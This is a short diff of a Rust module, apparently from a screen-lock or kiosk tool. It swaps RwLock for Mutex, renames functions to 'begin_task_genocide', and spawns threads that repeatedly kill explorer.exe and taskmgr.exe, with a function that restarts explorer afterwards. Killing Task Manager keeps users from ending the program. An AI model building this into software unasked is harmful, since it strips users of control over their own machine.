@@ -4,7 +4,7 @@ use std::{
     process::Command,
     sync::{
         atomic::{AtomicBool, Ordering},
-        RwLock,
+        Mutex,
     },
     thread::JoinHandle,
     time::Duration,
@@ -18,20 +18,20 @@ const KILL_DELAY: u64 = 5000;
 static ACTIVE: AtomicBool = AtomicBool::new(false);
 
 lazy_static::lazy_static! {
-    static ref THREADS: RwLock<Vec<JoinHandle<()>>> = RwLock::new(Vec::new());
+    static ref THREADS: Mutex<Vec<JoinHandle<()>>> = Mutex::new(Vec::new());
 }
 
-pub fn spawn_serial_taskkillers() {
+pub fn begin_task_genocide() {
     // If already active, despawn the existing threads
     if ACTIVE.load(Ordering::Relaxed) {
-        despawn_serial_taskkillers();
+        stop_task_genocide();
     }
 
     // Set global active to true (allows threads to execute)
     ACTIVE.store(true, Ordering::Relaxed);
 
     // Get a lock on the threads
-    let mut threads = THREADS.write().unwrap();
+    let mut threads = THREADS.lock().unwrap();
 
     // Spawn a thread to kill explorer (desktop shell) process repeatedly
     threads.push(spawn_killer("explorer.exe"));
@@ -40,7 +40,7 @@ pub fn spawn_serial_taskkillers() {
     threads.push(spawn_killer("taskmgr.exe"));
 }
 
-pub fn despawn_serial_taskkillers() {
+pub fn stop_task_genocide() {
     // If not already active, no nothing
     if !ACTIVE.load(Ordering::Relaxed) {
         return;
@@ -50,7 +50,7 @@ pub fn despawn_serial_taskkillers() {
     ACTIVE.store(false, Ordering::Relaxed);
 
     // Get a lock on the threads
-    let mut threads = THREADS.write().unwrap();
+    let mut threads = THREADS.lock().unwrap();
 
     // Remove all the threads and join one by one
     while !threads.is_empty() {
@@ -63,6 +63,7 @@ pub fn despawn_serial_taskkillers() {
 }
 
 fn respawn_tasks() {
+    // Respawn explorer desktop process
     Command::new("explorer")
         .spawn()
         .expect("Could not restart explorer");
